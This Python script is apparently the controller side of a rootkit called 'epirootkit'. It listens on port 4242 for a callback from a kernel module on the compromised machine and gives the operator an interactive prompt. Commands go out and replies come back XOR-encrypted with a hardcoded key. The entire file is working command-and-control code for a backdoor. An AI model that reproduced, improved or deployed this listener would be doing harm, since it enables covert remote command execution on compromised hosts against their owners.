import socket

KEY = b"epirootkit"
HOST = "0.0.0.0"
PORT = 4242


def xor(data: bytes) -> bytes:
    return bytes(b ^ KEY[i % len(KEY)] for i, b in enumerate(data))


def handle_client(client):
    try:
        while True:
            cmd = input("epirootkit> ").strip()
            if not cmd:
                continue

            encrypted = xor(cmd.encode())
            client.sendall(encrypted)

            response = client.recv(2048)
            if not response:
                print("Connection closed by kernel module.")
                break

            print("\n--- Response ---")
            print(xor(response).decode(errors="ignore"))
            print("---------------\n")

    except KeyboardInterrupt:
        print("\nExiting client.")
    finally:
        client.close()


def main():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((HOST, PORT))
        server.listen(1)
        print(f"[*] Waiting for connection on {HOST}:{PORT}...")

        client, addr = server.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        handle_client(client)


if __name__ == "__main__":
    main()
